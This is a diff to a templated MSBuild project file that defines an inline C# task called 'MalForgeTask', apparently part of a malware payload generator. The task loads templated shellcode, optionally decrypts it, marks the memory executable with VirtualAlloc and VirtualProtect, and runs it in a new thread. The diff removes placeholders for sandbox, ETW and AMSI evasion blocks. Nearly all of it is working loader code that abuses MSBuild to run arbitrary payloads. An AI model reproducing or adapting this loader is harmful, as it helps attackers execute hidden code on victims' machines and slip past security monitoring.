@@ -3,16 +3,16 @@
     <MalForgeTask/>
   </Target>
   <UsingTask TaskName="MalForgeTask" TaskFactory="CodeTaskFactory"
-    AssemblyFile="Microsoft.Build.Tasks.v4.0.dll">
+    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
     <Task>
-      <Reference Include="System.Security" />
+      <Reference Include="System" />
       <Using Namespace="System" />
       <Using Namespace="System.Runtime.InteropServices" />
       {{ msbuild_crypto_using }}
       <Code Type="Class" Language="cs"><![CDATA[
 using System;
 using System.Runtime.InteropServices;
-{{ crypto_using }}
+{{ crypto_using_fragment }}
 using Microsoft.Build.Utilities;
 using Microsoft.Build.Framework;
 
@@ -30,15 +30,8 @@ public class MalForgeTask : Task
     [DllImport("kernel32.dll")]
     static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
 
-    [DllImport("kernel32.dll")]
-    static extern void Sleep(uint ms);
-{{ amsi_imports }}
-
     public override bool Execute()
     {
-{{ sandbox_block }}
-{{ etw_block }}
-{{ amsi_block }}
         byte[] {% if is_encrypted %}enc{% else %}buf{% endif %} = new byte[] { {{ shellcode }} };
 {{ decrypt_block }}
         IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x04);
@@ -46,7 +39,7 @@ public class MalForgeTask : Task
         uint _vp;
         VirtualProtect(addr, (uint)buf.Length, 0x20, out _vp);
         IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-        WaitForSingleObject(hThread, 5000); // 5s timeout for testing
+        WaitForSingleObject(hThread, 5000);
         return true;
     }
 }
